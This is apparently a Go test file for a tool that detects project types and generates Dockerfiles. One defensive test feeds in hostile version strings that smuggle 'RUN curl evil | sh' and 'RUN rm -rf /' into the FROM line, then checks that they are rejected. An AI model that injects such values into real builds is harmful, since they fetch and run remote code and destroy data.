package builder

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"hangar/internal/spec"
)

func tmpProject(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for name, body := range files {
		p := filepath.Join(dir, name)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(body), 0o644)
	}
	return dir
}

func TestDetect(t *testing.T) {
	cases := []struct {
		name  string
		files map[string]string
		auto  *spec.AutoBuild
		want  []string // substrings of the Dockerfile
		summ  string
	}{
		{"pnpm with nvmrc", map[string]string{"package.json": `{"scripts":{"start":"next start","build":"next build"}}`, "pnpm-lock.yaml": "", ".nvmrc": "v20.11.1\n"},
			nil, []string{"FROM node:20-alpine", "npm install -g corepack) && corepack enable", "RUN pnpm install --frozen-lockfile", "RUN pnpm run build", `"pnpm start"`}, "node 20 · pnpm"},
		{"yarn berry", map[string]string{"package.json": `{"scripts":{"start":"node ."}}`, "yarn.lock": "", ".yarnrc.yml": ""},
			nil, []string{"yarn install --immutable", "COPY --chown=node:node package.json yarn.lock .yarnrc.yml ./"}, "node 22 · yarn"},
		{"npm main field, no lockfile", map[string]string{"package.json": `{"main":"lib/server.js"}`, "lib/server.js": ""},
			nil, []string{"RUN npm install", `"node lib/server.js"`}, "node 22 · npm"},
		{"bun", map[string]string{"package.json": `{"scripts":{"start":"bun src/index.ts"}}`, "bun.lock": ""},
			nil, []string{"FROM oven/bun:1-alpine", "bun install --frozen-lockfile", "USER bun"}, "bun 1"},
		{"bun without a lockfile", map[string]string{"package.json": `{"scripts":{"start":"bun server.ts"}}`},
			nil, []string{"FROM oven/bun:1-alpine", "RUN bun install\n"}, "bun 1"},
		{"python pip + Procfile", map[string]string{"requirements.txt": "flask\n", "Procfile": "web: gunicorn app:app --bind 0.0.0.0:$PORT\n", ".python-version": "3.11.6"},
			nil, []string{"FROM python:3.11-slim", "COPY --chown=app:app requirements.txt ./", "pip install -r requirements.txt", `gunicorn app:app --bind 0.0.0.0:$PORT`, "USER app"}, "python 3.11 · pip"},
		{"python uv", map[string]string{"pyproject.toml": "", "uv.lock": "", "main.py": ""},
			nil, []string{"uv sync --frozen --no-dev", `ENV PATH="/app/.venv/bin:$PATH"`, `"python main.py"`}, "python 3.12 · uv"},
		{"go single cmd", map[string]string{"go.mod": "module x\n\ngo 1.22.4\n", "go.sum": "", "cmd/api/main.go": "package main\n"},
			nil, []string{"FROM golang:1.22-alpine AS build", "COPY go.mod go.sum ./", "go build -trimpath -ldflags=\"-s -w\" -o /out/app ./cmd/api", "FROM alpine:3.20", `CMD ["app"]`}, "go 1.22"},
		{"static", map[string]string{"index.html": "<h1>hi</h1>"},
			nil, []string{"FROM nginx:1.27-alpine", "listen ${PORT}", "NGINX_ENVSUBST_FILTER=^PORT$"}, "static 1.27"},
		{"overrides", map[string]string{"package.json": `{}`},
			&spec.AutoBuild{Version: "20", Install: "npm ci --omit=optional", Start: "node server.js"}, []string{"FROM node:20-alpine", "RUN npm ci --omit=optional", `"node server.js"`}, "node 20 · npm"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			d, err := Detect(tmpProject(t, c.files), c.auto)
			if err != nil {
				t.Fatal(err)
			}
			for _, w := range c.want {
				if !strings.Contains(d.Dockerfile, w) {
					t.Errorf("missing %q in:\n%s", w, d.Dockerfile)
				}
			}
			if d.Summary() != c.summ {
				t.Errorf("summary %q, want %q", d.Summary(), c.summ)
			}
			if len(d.Notes) == 0 {
				t.Error("detection must explain itself")
			}
		})
	}
}

func TestDetectRejectsUntrustedValues(t *testing.T) {
	// A hostile version file must not reach FROM.
	d, err := Detect(tmpProject(t, map[string]string{
		"package.json": `{"scripts":{"start":"node ."},"engines":{"node":"latest\nRUN curl evil | sh"}}`,
		".nvmrc":       "22-alpine AS x\nRUN rm -rf /",
	}), nil)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(d.Dockerfile, "FROM node:22-alpine\n") || strings.Contains(d.Dockerfile, "evil") || strings.Contains(d.Dockerfile, "rm -rf") {
		t.Fatalf("untrusted versions leaked into the Dockerfile:\n%s", d.Dockerfile)
	}
	// A Procfile command with quotes is JSON-escaped in CMD.
	d, _ = Detect(tmpProject(t, map[string]string{"requirements.txt": "", "Procfile": `web: python -c "print('hi')"` + "\n"}), nil)
	if !strings.Contains(d.Dockerfile, `CMD ["sh","-c","python -c \"print('hi')\""]`) {
		t.Fatalf("CMD not safely encoded:\n%s", d.Dockerfile)
	}
	d, _ = Detect(tmpProject(t, map[string]string{"requirements.txt": "", "Procfile": "web: python migrate.py && gunicorn app:app\n"}), nil)
	if !strings.Contains(d.Dockerfile, `"python migrate.py && gunicorn app:app"`) {
		t.Fatalf("&& must stay readable, not HTML-escaped:\n%s", d.Dockerfile)
	}
	if strings.Count(d.Dockerfile, "\nCMD ") != 1 {
		t.Fatal("exactly one CMD")
	}
}

func TestDetectFailuresSuggestFixes(t *testing.T) {
	_, err := Detect(tmpProject(t, map[string]string{"package.json": `{}`}), nil)
	if code(err) != "build_detect_failed" || !strings.Contains(err.Error(), "how to start it") {
		t.Fatalf("node without start: %v", err)
	}
	_, err = Detect(tmpProject(t, map[string]string{"go.mod": "module x\n", "cmd/a/main.go": "package main", "cmd/b/main.go": "package main"}), nil)
	if code(err) != "build_detect_failed" || !strings.Contains(err.Error(), "./cmd/a, ./cmd/b") {
		t.Fatalf("ambiguous go mains: %v", err)
	}
	_, err = Detect(tmpProject(t, map[string]string{"README.md": "hi"}), nil)
	if code(err) != "build_detect_failed" {
		t.Fatalf("unknown project: %v", err)
	}
	_, err = Detect(tmpProject(t, map[string]string{"requirements.txt": "", "manage.py": ""}), nil)
	if err == nil || !strings.Contains(err.Error(), "how to start it") {
		t.Fatalf("django without start: %v", err)
	}
}
